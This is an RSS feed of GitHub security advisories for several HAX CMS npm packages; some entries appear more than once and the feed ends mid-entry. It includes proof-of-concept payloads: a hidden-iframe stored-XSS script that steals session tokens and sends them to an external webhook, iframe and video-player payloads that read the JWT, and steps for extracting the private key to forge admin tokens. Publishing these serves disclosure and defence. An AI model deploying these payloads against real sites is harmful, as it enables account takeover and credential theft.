<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-05-19T15:09:15.683Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HAXcms: Mass Token Exfiltration and Cross-Tenant Hijack ]]></title>
        <id>https://github.com/advisories/GHSA-x3x5-7h4h-gwxg</id>
        <link href="https://github.com/advisories/GHSA-x3x5-7h4h-gwxg"/>
        <updated>2026-05-19T14:47:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attack chain utilizing <strong>Stored XSS</strong> alongside dynamic token exposure in the <code>/system/api/connectionSettings</code> endpoint allows an authenticated attacker to perform a complete cross-tenant account takeover. The API dynamically leaks the active session's authentication tokens (including the <code>jwt</code>, <code>user_token</code>, <code>site_token</code>, and <code>appstore_token</code>) into a global JavaScript variable (<code>window.appSettings</code>). An attacker can exploit the XSS vulnerability to force a victim's browser to silently fetch their specific connection settings, extract the tokens, and exfiltrate them to an attacker-controlled webhook.</p>
<h3 id="details">Details</h3>
<p>In <code>Operations.php</code> (<code>connectionSettings()</code>), the system returns a Javascript object designed to bootstrap the frontend context. This object, <code>window.appSettings</code>, acts as a "skeleton key" because it aggregates all necessary operational tokens for the active session. </p>
<p>While HAXcms correctly relies on the cryptographically signed JWT for backend authentication (preventing Direct Object Reference/IDOR attempts), the CMS fails to secure the tokens themselves. Specifically:</p>
<ol>
<li><strong>The Vector</strong>: The system is vulnerable to Stored XSS (e.g., via injected <code>iframe</code> <code>srcdoc</code> or <code>&lt;video-player&gt;</code>).</li>
<li><strong>The Exposure</strong>: Because the <code>connectionSettings</code> endpoint serves the tokens locally based on the active <code>PHPSESSID</code> cookie, any malicious script running in the browser context can intercept these keys.</li>
<li><strong>The Chain</strong>: HAXcms isolates user environments by URL path (<code>/&lt;username&gt;/</code>). An attacker can use XSS to force the victim's browser to fetch their <em>target</em> username's specific settings via <code>fetch('/&lt;username&gt;/system/api/connectionSettings')</code>. Since the browser implicitly attaches the victim's session cookie, the server authenticates the request and returns the victim's valid JWT and tokens.</li>
</ol>
<h3 id="poc">PoC</h3>
<p><strong>1. Setup the Webhook Target</strong>
Prepare an external webhook (e.g., <code>webhook.site</code>) to receive the stolen data.</p>
<p><strong>2. Inject the "Kill Chain" Payload</strong>
As an authenticated attacker (e.g., having edit access to any site), inject the following Javascript via the verified Stored XSS vectors (such as checking the HTML Source of a page and writing an <code>&lt;iframe&gt;</code>):</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
    const targetUsername = 'bto108'; // Replace with target victim

    fetch(`/${targetUsername}/system/api/connectionSettings`)
      .then(res =&gt; res.text())
      .then(data =&gt; {
          const s = JSON.parse(data.substring(data.indexOf('{'), data.lastIndexOf('}') + 1));
          
          const uToken = new URL(document.location.origin + s.getUserDataPath).searchParams.get('user_token');
          const sToken = new URL(document.location.origin + s.saveNodePath).searchParams.get('site_token');
          
          let aToken = 'N/A';
          if (s.appStore &amp;&amp; s.appStore.params &amp;&amp; s.appStore.params.appstore_token) {
              aToken = s.appStore.params.appstore_token;
          }

          // Exfiltrate via Image Request to bypass CORS
          const payload = btoa(JSON.stringify({
              target: targetUsername, 
              jwt: s.jwt, 
              user_token: uToken, 
              site_token: sToken, 
              appstore_token: aToken
          }));
          
          new Image().src = `https://webhook.site/YOUR-WEBHOOK-ID?data=${payload}`;
      });
&lt;/script&gt;" style="display:none"&gt;&lt;/iframe&gt;
</code></pre>
<p><strong>3. Execution &amp; Verification</strong></p>
<ul>
<li>When the victim (e.g., user <code>bto108</code>) views the compromised page, their browser automatically fires the <code>fetch</code> request, silently attaching their active session cookie.</li>
<li>The server responds with their connection settings.</li>
<li>The script parses their <code>jwt</code>, <code>user_token</code>, and other keys, encoding them in base64.</li>
<li>The attacker receives the full JWT and token dump on their webhook.</li>
</ul>
<p><em>Screenshots confirming the data leakage and webhook capture:</em>
<img src="https://github.com/user-attachments/assets/1aeee4ee-9475-4430-b4d3-3c6254075d11" alt="Connection Settings Exposure">
<img src="https://github.com/user-attachments/assets/7179c1a5-2bfb-4ab6-ba1d-29bcb61a74d3" alt="Secondary Settings Leak">
<img src="https://github.com/user-attachments/assets/1abd21ec-fd45-4bd8-ba67-9c0bb19e6b08" alt="Cross-tenant Exfiltration Console">
<img src="https://github.com/user-attachments/assets/751e5cab-f4ad-4ab4-b276-86bf738f0434" alt="Webhook Payload Capture">
<img src="https://github.com/user-attachments/assets/a41e15f7-1652-4351-8cc9-a423f6220158" alt="Stolen Data Result"></p>
<h3 id="impact">Impact</h3>
<p><strong>Critical Severity.</strong> 
This attack completely compromises the primary defense mechanism of the CMS. By stealing the <code>jwt</code> and <code>user_token</code>, the attacker achieves <strong>total account hijacking</strong> without needing the victim's password. They can emulate the victim perfectly, bypassing standard interface restrictions to perform malicious administrative actions (creating/deleting sites, modifying user access, or uploading malicious content).</p>
<p>The reliance on a global Javascript variable (<code>window.appSettings</code>) to store long-lived administrative security tokens creates a devastating chokepoint when combined with XSS.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-x3x5-7h4h-gwxg">https://github.com/haxtheweb/issues/security/advisories/GHSA-x3x5-7h4h-gwxg</a></li>
<li><a href="https://github.com/advisories/GHSA-x3x5-7h4h-gwxg">https://github.com/advisories/GHSA-x3x5-7h4h-gwxg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x3x5-7h4h-gwxg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T14:47:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/iframe-loader] Stored XSS via <iframe> in HAX CMS allows access to sensitive client-side data and account takeover]]></title>
        <id>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</id>
        <link href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36"/>
        <updated>2026-05-19T14:46:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of <code>&lt;iframe&gt;</code> elements.</p>
<p>The application allows <code>javascript:</code> URIs in the <code>src</code> attribute, which are executed when a malicious page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data exposed to client-side scripts.</p>
<h3 id="details">Details</h3>
<p>Successful exploitation allows access to any data available in the browser context, including:</p>
<ul>
<li>Authentication tokens (e.g., JWT)</li>
<li>Session cookies (if not protected with HttpOnly)</li>
<li>Application configuration (e.g., window.appSettings)</li>
<li>User-specific data accessible via APIs</li>
</ul>
<p>This significantly increases the impact beyond simple script execution.</p>
<h3 id="poc">PoC</h3>
<p>Steps to reproduce:</p>
<ol>
<li>Log in to HAX CMS as any authenticated user.</li>
<li>Create a new page or edit an existing page.</li>
<li>Open the HTML source editor (<code>&lt;&gt;</code>).</li>
<li>Insert the following payload:</li>
</ol>
<pre><code class="language-html">&lt;iframe srcdoc="&amp;lt;script&amp;gt;
    (function(){
        try {
            var jwt = parent.window.appSettings.jwt;
            alert('Stolen JWT:\n' + jwt);
        } catch(e) {
            alert('Error: ' + e.message);
        }
    })();
&amp;lt;/script&amp;gt;" style="display:none" sandbox="allow-scripts allow-same-origin"&gt;&lt;/iframe&gt;
</code></pre>
<img width="2446" height="1319" alt="image" src="https://github.com/user-attachments/assets/daea3b41-8c72-4f6c-ab32-34c688bbd251">


<img width="2464" height="1397" alt="image" src="https://github.com/user-attachments/assets/911cbd42-db50-454a-b178-51555e0db79c">



<img width="2466" height="1409" alt="webhook`" src="https://github.com/user-attachments/assets/8a286435-98f4-418c-a596-d0c19556696a">

<h3 id="impact">Impact</h3>
<p>This vulnerability allows stored XSS leading to:</p>
<ul>
<li>Execution of arbitrary JavaScript in victim browsers</li>
<li>Access to sensitive client-side data, including authentication tokens and session identifiers</li>
<li>Unauthorized API actions performed on behalf of the victim</li>
<li>Session hijacking and full account takeover</li>
</ul>
<p>Because the application exposes authentication data in the client-side environment, exploitation of this vulnerability can lead to complete compromise of user accounts and site content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36</a></li>
<li><a href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/advisories/GHSA-jh3h-rpxg-fr36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T14:46:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/video-player] Stored XSS via <iframe> in HAX CMS allows access to sensitive client-side data and account takeover]]></title>
        <id>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</id>
        <link href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36"/>
        <updated>2026-05-19T14:46:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of <code>&lt;iframe&gt;</code> elements.</p>
<p>The application allows <code>javascript:</code> URIs in the <code>src</code> attribute, which are executed when a malicious page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data exposed to client-side scripts.</p>
<h3 id="details">Details</h3>
<p>Successful exploitation allows access to any data available in the browser context, including:</p>
<ul>
<li>Authentication tokens (e.g., JWT)</li>
<li>Session cookies (if not protected with HttpOnly)</li>
<li>Application configuration (e.g., window.appSettings)</li>
<li>User-specific data accessible via APIs</li>
</ul>
<p>This significantly increases the impact beyond simple script execution.</p>
<h3 id="poc">PoC</h3>
<p>Steps to reproduce:</p>
<ol>
<li>Log in to HAX CMS as any authenticated user.</li>
<li>Create a new page or edit an existing page.</li>
<li>Open the HTML source editor (<code>&lt;&gt;</code>).</li>
<li>Insert the following payload:</li>
</ol>
<pre><code class="language-html">&lt;iframe srcdoc="&amp;lt;script&amp;gt;
    (function(){
        try {
            var jwt = parent.window.appSettings.jwt;
            alert('Stolen JWT:\n' + jwt);
        } catch(e) {
            alert('Error: ' + e.message);
        }
    })();
&amp;lt;/script&amp;gt;" style="display:none" sandbox="allow-scripts allow-same-origin"&gt;&lt;/iframe&gt;
</code></pre>
<img width="2446" height="1319" alt="image" src="https://github.com/user-attachments/assets/daea3b41-8c72-4f6c-ab32-34c688bbd251">


<img width="2464" height="1397" alt="image" src="https://github.com/user-attachments/assets/911cbd42-db50-454a-b178-51555e0db79c">



<img width="2466" height="1409" alt="webhook`" src="https://github.com/user-attachments/assets/8a286435-98f4-418c-a596-d0c19556696a">

<h3 id="impact">Impact</h3>
<p>This vulnerability allows stored XSS leading to:</p>
<ul>
<li>Execution of arbitrary JavaScript in victim browsers</li>
<li>Access to sensitive client-side data, including authentication tokens and session identifiers</li>
<li>Unauthorized API actions performed on behalf of the victim</li>
<li>Session hijacking and full account takeover</li>
</ul>
<p>Because the application exposes authentication data in the client-side environment, exploitation of this vulnerability can lead to complete compromise of user accounts and site content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36</a></li>
<li><a href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/advisories/GHSA-jh3h-rpxg-fr36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T14:46:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] Stored XSS via <iframe> in HAX CMS allows access to sensitive client-side data and account takeover]]></title>
        <id>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</id>
        <link href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36"/>
        <updated>2026-05-19T14:46:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of <code>&lt;iframe&gt;</code> elements.</p>
<p>The application allows <code>javascript:</code> URIs in the <code>src</code> attribute, which are executed when a malicious page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data exposed to client-side scripts.</p>
<h3 id="details">Details</h3>
<p>Successful exploitation allows access to any data available in the browser context, including:</p>
<ul>
<li>Authentication tokens (e.g., JWT)</li>
<li>Session cookies (if not protected with HttpOnly)</li>
<li>Application configuration (e.g., window.appSettings)</li>
<li>User-specific data accessible via APIs</li>
</ul>
<p>This significantly increases the impact beyond simple script execution.</p>
<h3 id="poc">PoC</h3>
<p>Steps to reproduce:</p>
<ol>
<li>Log in to HAX CMS as any authenticated user.</li>
<li>Create a new page or edit an existing page.</li>
<li>Open the HTML source editor (<code>&lt;&gt;</code>).</li>
<li>Insert the following payload:</li>
</ol>
<pre><code class="language-html">&lt;iframe srcdoc="&amp;lt;script&amp;gt;
    (function(){
        try {
            var jwt = parent.window.appSettings.jwt;
            alert('Stolen JWT:\n' + jwt);
        } catch(e) {
            alert('Error: ' + e.message);
        }
    })();
&amp;lt;/script&amp;gt;" style="display:none" sandbox="allow-scripts allow-same-origin"&gt;&lt;/iframe&gt;
</code></pre>
<img width="2446" height="1319" alt="image" src="https://github.com/user-attachments/assets/daea3b41-8c72-4f6c-ab32-34c688bbd251">


<img width="2464" height="1397" alt="image" src="https://github.com/user-attachments/assets/911cbd42-db50-454a-b178-51555e0db79c">



<img width="2466" height="1409" alt="webhook`" src="https://github.com/user-attachments/assets/8a286435-98f4-418c-a596-d0c19556696a">

<h3 id="impact">Impact</h3>
<p>This vulnerability allows stored XSS leading to:</p>
<ul>
<li>Execution of arbitrary JavaScript in victim browsers</li>
<li>Access to sensitive client-side data, including authentication tokens and session identifiers</li>
<li>Unauthorized API actions performed on behalf of the victim</li>
<li>Session hijacking and full account takeover</li>
</ul>
<p>Because the application exposes authentication data in the client-side environment, exploitation of this vulnerability can lead to complete compromise of user accounts and site content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/haxtheweb/issues/security/advisories/GHSA-jh3h-rpxg-fr36</a></li>
<li><a href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36">https://github.com/advisories/GHSA-jh3h-rpxg-fr36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T14:46:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HAXcms: Private Key Disclosure via Broken HMAC Implementation]]></title>
        <id>https://github.com/advisories/GHSA-6c8g-9hfh-pq5h</id>
        <link href="https://github.com/advisories/GHSA-6c8g-9hfh-pq5h"/>
        <updated>2026-05-19T14:44:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>hmacBase64()</code> function in the HAXcms Node.js backend contains two critical cryptographic implementation errors that together allow any unauthenticated attacker to extract the system’s private signing key and forge arbitrary admin-level JSON Web Tokens (JWTs) allowing them to get full admin access with a single HTTP request.</p>
<h3 id="details">Details</h3>
<p>Bug 1: Hardcoded HMAC Key (line 2160): The function passes the literal string "0" as the HMAC signing key instead of the key parameter, making every HAXcms instance compute identical HMACs for the same input.</p>
<p>Bug 2: Private Key Appended to Output (lines 2161- 2163): After computing the HMAC, the function concatenates the real key parameter which is "this.privateKey + this.salt", the system’s master signing secret is directly onto the output. The combined buffer is base64-encoded and returned as the token.</p>
<p>Every base64url token produced has the same structure: 32 bytes HMAC keyed with "0" and N bytes of <code>privateKey+salt</code>. An attacker base64-decodes any token, discards the first 32 bytes, and reads the private key directly.</p>
<p>The <code>/system/api/connectionSettings</code> endpoint is unauthenticated and returns multiple tokens generated by this function. A single GET request to this endpoint exposes the private key.</p>
<p>The PHP backend (HAXCMS.php:1619-1631) implements this function correctly with the actual key and returns only the hash. The PHP version produces 44-character tokens whereas the broken Node.js version produces 139+ character tokens.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>GET request to <code>/system/api/connectionSettings</code> endpoint and fetch the token.</li>
<li>Extract the private key from the fetched token. The <code>hmacBase64()</code> function produces 32 bytes with HMAC-SHA256 with hardcoded key "0" and the rest of the bytes are <code>privateKey+salt</code> (plaintext). Decode the Base64 token, discard the first 32 bytes, read the remaining bytes as UTF-8 (this is your extracted private key).</li>
<li>Since JWT's are signed with <code>privateKey+salt</code>, use this stolen private key to forge a JWT for admin using <code>JWT.sign(payload, this.privateKey+this.salt)</code>. NOTE: the payload uses {id, user (set this as admin), iat (current timestamp), exp (expiration timestamp)}</li>
<li>The same key can also be used to create other tokens (user_token, base_token, form_token, etc).</li>
<li>Use these forged tokens to hit all authenticated endpoints (modify/delete/create etc) with admin privileges.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can perform the complete attack chain with a single HTTP request:</p>
<ol>
<li>Extract private key: GET "/system/api/connectionSettings", base64-decode any token, discard first 32 bytes.</li>
<li>Forge admin JWT: sign arbitrary JWT payloads with the stolen privateKey+salt.</li>
<li>Forge all request tokens: compute valid user_token, site_token for any API call.</li>
<li>Full admin access: create/modify/delete sites, upload files, modify content.</li>
</ol>
<p>This works even if the admin has changed the default credentials to a strong password. The forged tokens produce no login events in logs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-6c8g-9hfh-pq5h">https://github.com/haxtheweb/issues/security/advisories/GHSA-6c8g-9hfh-pq5h</a></li>
<li><a href="https://github.com/advisories/GHSA-6c8g-9hfh-pq5h">https://github.com/advisories/GHSA-6c8g-9hfh-pq5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6c8g-9hfh-pq5h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-19T14:44:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/open-apis] HAX open-apis: Credential Theft via Server-Side Request Forgery (SSRF) in open-apis]]></title>
        <id>https://github.com/advisories/GHSA-4fg7-f244-3j49</id>
        <link href="https://github.com/advisories/GHSA-4fg7-f244-3j49"/>
        <updated>2026-05-19T14:44:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Multiple functions conduct substring-only matching to validate hostnames to which basic authorization should be sent. An attacker can append the matched substrings to an attacker-controlled endpoint and capture authentication.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/services/website/cacheAddress.js#L21">api/services/website/cacheAddress.js</a>, <a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/apps/haxcms/lib/JOSHelpers.js#L26">api/apps/haxcms/lib/JOSHelpers.js</a>, and <a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/apps/haxcms/convert/elmslnToSite.js#L37">api/apps/haxcms/convert/elmslnToSite.js</a> use similar logic to check for hard-coded site names. However, the logic only looks for the substring to be included in the user-controlled string, allowing an attacker to craft an API call and extract the credentials intended for the hard-coded domains.</p>
<h3 id="poc">PoC</h3>
<p>Making API calls to an affected endpoint will result in credential theft. The attacker-controlled domains in these proofs of concept are <code>cloudflared</code> tunnels, protecting the production credentials from unencrypted exposure.</p>
<p>cacheAddress.js:
<img width="3404" height="1656" alt="ssrf_cred_theft" src="https://github.com/user-attachments/assets/0a87cef5-3c4d-450a-8bb7-35123d5f621b"></p>
<p>elmslnToSite.js:
<img width="3409" height="1641" alt="theft2" src="https://github.com/user-attachments/assets/bede82cc-a613-4fc7-bbf6-76166af784f5"></p>
<p>JOSHelpers.js:
<img width="3407" height="1597" alt="theft3" src="https://github.com/user-attachments/assets/4f3f8bee-443e-4b22-9d41-eb9726619d36"></p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows internal data, including secrets, to be exfiltrated to an attacker-controlled domain. Credentials were confirmed with the maintainer to grant access to unreleased LMS content on subsequent systems; out of scope for PoC.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-4fg7-f244-3j49">https://github.com/haxtheweb/issues/security/advisories/GHSA-4fg7-f244-3j49</a></li>
<li><a href="https://github.com/advisories/GHSA-4fg7-f244-3j49">https://github.com/advisories/GHSA-4fg7-f244-3j49</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fg7-f244-3j49</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T14:44:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/video-player] HAX CMS: Stored XSS via '<video-player>' component allows arbitrary JavaScript execution and token theft]]></title>
        <id>https://github.com/advisories/GHSA-2m6p-hm3w-6jm3</id>
        <link href="https://github.com/advisories/GHSA-2m6p-hm3w-6jm3"/>
        <updated>2026-05-19T14:44:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of the <code>&lt;video-player&gt;</code> component.</p>
<p>The component allows <code>javascript:</code> URIs in the <code>source</code> attribute, which are executed when the page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data such as JWT tokens and more.</p>
<h3 id="details">Details</h3>
<p>The vulnerability is present in the <code>&lt;video-player&gt;</code> web component used within the HAX CMS editor.</p>
<p>The application fails to validate or sanitize user-supplied input in the following attributes:</p>
<ul>
<li><code>source</code></li>
<li><code>source-data</code></li>
</ul>
<p>These attributes accept arbitrary URI schemes, including <code>javascript:</code>, which leads to execution of attacker-controlled JavaScript in the browser.</p>
<p>Example vulnerable usage:</p>
<pre><code class="language-html">&lt;video-player 
  source="javascript:alert(document.domain)" 
  source-type="external"&gt;
&lt;/video-player&gt;
</code></pre>
<p>Because this content is stored and rendered to other users, the vulnerability is classified as a stored XSS.</p>
<p>The root cause is the lack of URI scheme validation and improper sanitization of component attributes before rendering.
Because this content is stored and rendered to other users, the vulnerability is classified as a stored XSS.</p>
<p>The root cause is the lack of URI scheme validation and improper sanitization of component attributes before rendering.</p>
<h3 id="poc">PoC</h3>
<p>Steps to reproduce:</p>
<ol>
<li>Log in to HAX CMS as user.</li>
<li>Create a website or any page and switch to the HTML source editor (<code>&lt;&gt;</code>).</li>
<li>Insert the following payload:</li>
</ol>
<pre><code class="language-html">&lt;video-player source="javascript:alert('JWT: '+localStorage.getItem('jwt').substring(0,30))" source-type="external"&gt;&lt;/video-player&gt;
</code></pre>
<img width="2456" height="1405" alt="image" src="https://github.com/user-attachments/assets/ea037043-7ff7-4840-bed0-1091692c6289">


<p>Save the page.</p>
<p>Reload or revisit or send the page.</p>
<p>Result
<img width="2468" height="1394" alt="image" src="https://github.com/user-attachments/assets/543bbf69-900d-4e2d-bd6b-0658fb5aa899"></p>
<p>A JavaScript alert executes.
The JWT token is exposed.
This confirms arbitrary JavaScript execution in the victim’s browser.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows stored XSS leading to:</p>
<ul>
<li>Theft of JWT authentication tokens </li>
<li>Session hijacking</li>
<li>Full account takeover</li>
<li>Execution of arbitrary JavaScript in victim browsers</li>
</ul>
<p>If an administrator views a malicious page, this can lead to full CMS compromise.</p>
<p>Attack complexity: Low<br>Privileges required: Low (any authenticated user)<br>User interaction: Required</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-2m6p-hm3w-6jm3">https://github.com/haxtheweb/issues/security/advisories/GHSA-2m6p-hm3w-6jm3</a></li>
<li><a href="https://github.com/advisories/GHSA-2m6p-hm3w-6jm3">https://github.com/advisories/GHSA-2m6p-hm3w-6jm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2m6p-hm3w-6jm3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-19T14:44:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HAX CMS: Stored XSS via '<video-player>' component allows arbitrary JavaScript execution and token theft]]></title>
        <id>https://github.com/advisories/GHSA-2m6p-hm3w-6jm3</id>
        <link href="https://github.com/advisories/GHSA-2m6p-hm3w-6jm3"/>
        <updated>2026-05-19T14:44:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of the <code>&lt;video-player&gt;</code> component.</p>
<p>The component allows <code>javascript:</code> URIs in the <code>source</code> attribute, which are executed when the page is viewed. This enables attackers to execute arbitrary JavaScript in the context of the victim’s browser and access sensitive data such as JWT tokens and more.</p>
<h3 id="details">Details</h3>
<p>The vulnerability is present in the <code>&lt;video-player&gt;</code> web component used within the HAX CMS editor.</p>
<p>The application fails to validate or sanitize user-supplied input in the following attributes:</p>
<ul>
<li><code>source</code></li>
<li><code>source-data</code></li>
</ul>
<p>These attributes accept arbitrary URI schemes, including <code>javascript:</code>, which leads to execution of attacker-controlled JavaScript in the browser.</p>
<p>Example vulnerable usage:</p>
<pre><code class="language-html">&lt;video-player 
  source="javascript:alert(document.domain)" 
  source-type="external"&gt;
&lt;/video-player&gt;
</code></pre>
<p>Because this content is stored and rendered to other users, the vulnerability is classified as a stored XSS.</p>
<p>The root cause is the lack of URI scheme validation and improper sanitization of component attributes before rendering.
Because this content is stored and rendered to other users, the vulnerability is classified as a stored XSS.</p>
<p>The root cause is the lack of URI scheme validation and improper sanitization of component attributes before rendering.</p>
<h3 id="poc">PoC</h3>
<p>Steps to reproduce:</p>
<ol>
<li>Log in to HAX CMS as user.</li>
<li>Create a website or any page and switch to the HTML source editor (<code>&lt;&gt;</code>).</li>
<li>Insert the following payload:</li>
</ol>
<pre><code class="language-html">&lt;video-player source="javascript:alert('JWT: '+localStorage.getItem('jwt').substring(0,30))" source-type="external"&gt;&lt;/video-player&gt;
</code></pre>
<img width="2456" height="1405" alt="image" src="https://github.com/user-attachments/assets/ea037043-7ff7-4840-bed0-1091692c6289">


<p>Save the page.</p>
<p>Reload or revisit or send the page.</p>
<p>Result
<img width="2468" height="1394" alt="image" src="https://github.com/user-attachments/assets/543bbf69-900d-4e2d-bd6b-0658fb5aa899"></p>
<p>A JavaScript alert executes.
The JWT token is exposed.
This confirms arbitrary JavaScript execution in the victim’s browser.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows stored XSS leading to:</p>
<ul>
<li>Theft of JWT authentication tokens </li>
<li>Session hijacking</li>
<li>Full account takeover</li>
<li>Execution of arbitrary JavaScript in victim browsers</li>
</ul>
<p>If an administrator views a malicious page, this can lead to full CMS compromise.</p>
<p>Attack complexity: Low<br>Privileges required: Low (any authenticated user)<br>User interaction: Required</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-2m6p-hm3w-6jm3">https://github.com/haxtheweb/issues/security/advisories/GHSA-2m6p-hm3w-6jm3</a></li>
<li><a href="https://github.com/advisories/GHSA-2m6p-hm3w-6jm3">https://github.com/advisories/GHSA-2m6p-hm3w-6jm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2m6p-hm3w-6jm3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-19T14:44:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HAXcms createSite SSRF Enables Arbitrary File Read]]></title>
        <id>https://github.com/advisories/GHSA-q862-gcgq-5m6g</id>
        <link href="https://github.com/advisories/GHSA-q862-gcgq-5m6g"/>
        <updated>2026-05-19T14:44:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An authenticated Server-Side Request Forgery (SSRF) vulnerability in HAXcms allows users to fetch arbitrary internal or local resources and write the responses to a web-accessible directory, enabling arbitrary file read and internal network access.</p>
<h3 id="details">Details</h3>
<p>The <code>createSite</code> endpoint in HAXcms (v11.0.6) accepts a <code>build.files</code> parameter that allows an authenticated user to supply arbitrary URLs or local file paths. This input is processed without validation and ultimately fetched server-side using <code>file_get_contents()</code>.</p>
<p>The data flow is as follows:</p>
<ul>
